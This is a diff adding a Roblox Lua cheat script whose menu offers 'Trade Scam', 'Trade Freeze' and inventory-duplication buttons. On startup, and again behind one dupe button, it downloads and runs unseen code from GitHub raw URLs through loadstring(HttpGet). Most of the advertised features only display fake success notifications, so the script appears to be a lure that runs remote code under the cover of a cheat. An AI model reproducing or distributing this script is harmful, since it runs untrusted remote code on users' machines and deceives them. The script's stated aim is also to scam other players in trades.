@@ -1,0 +1,59 @@
+local scriptlib =
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HiScript2/Src3/refs/heads/main/dupesrc2.txt"))()
+
+local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local PhantomForcesWindow = Library:NewWindow("Script Name")
+
+local KillingCheats = PhantomForcesWindow:NewSection("Trade scam 🎯")
+
+KillingCheats:CreateToggle("Enable Trade Scam", function(value)
+OrionLib:MakeNotification({
+    Name = " -| Notification ❗",
+    Content = "Trade Scam Activated Successfully",
+    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
+    Time = 10
+})
+print(value)
+end)
+
+local KillingCheats = PhantomForcesWindow:NewSection("Trade Freeze🧊")
+
+KillingCheats:CreateToggle("Enable Trade Freeze", function(value)
+OrionLib:MakeNotification({
+    Name = "- | Notification ❗",
+    Content = "Trade Freeze Activated Successfully ✓",
+    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
+    Time = 10
+})
+print(value)
+end)
+
+local PhantomForcesWindow = Library:NewWindow("🌌 - | Dupe🌌")
+
+local KillingCheats = PhantomForcesWindow:NewSection("Dupe 💵")
+
+KillingCheats:CreateButton("Dupe Inventory 💵", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HiScript2/Src3/refs/heads/main/dupesrc1.txt"))()
+OrionLib:MakeNotification({
+    Name = "- | Notification ❗",
+    Content = "Inventory Duped Successfully ✓",
+    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
+    Time = 10
+})
+print("HI")
+end)
+
+local KillingCheats = PhantomForcesWindow:NewSection("Dupe 💵")
+
+KillingCheats:CreateButton("Dupe Inventory 💵 Method 2", function()
+OrionLib:MakeNotification({
+    Name = "- | Notification ❗",
+    Content = "Inventory Duped Successfully ✓",
+    Image = "rbxthumb://type=Asset&id=18995759770&w=150&h=150",
+    Time = 10
+})
+print("HI")
+end)
